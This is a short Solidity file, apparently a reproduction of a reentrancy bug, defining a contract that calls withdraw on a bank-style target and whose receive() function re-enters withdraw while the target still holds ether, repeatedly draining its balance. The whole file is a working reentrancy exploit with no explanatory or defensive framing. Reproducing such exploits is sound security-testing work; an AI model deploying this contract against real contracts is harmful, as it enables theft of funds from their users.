interface IBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract Reproduction {
    IBank public target;

    constructor(address _target) {
        target = IBank(_target);
    }

    function trigger(uint amount) external {
        target.withdraw(amount);
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw(msg.value);
        }
    }
}